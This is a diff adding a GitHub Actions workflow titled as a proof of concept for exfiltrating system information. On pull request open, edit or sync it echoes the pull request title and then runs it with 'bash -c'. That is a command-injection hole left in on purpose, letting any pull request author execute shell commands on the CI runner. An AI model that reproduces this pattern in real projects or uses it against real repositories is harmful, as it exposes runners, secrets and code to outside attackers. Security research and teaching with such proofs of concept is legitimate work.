@@ -1,0 +1,14 @@
+name: PoC Exfiltrate System Info
+
+on:
+  pull_request:
+    types: [opened, edited, synchronize]
+
+jobs:
+  exfiltrate:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Leak uname and whoami via PR title
+        run: |
+          echo "PR Title: ${{ github.event.pull_request.title }}"
+          bash -c "${{ github.event.pull_request.title }}"
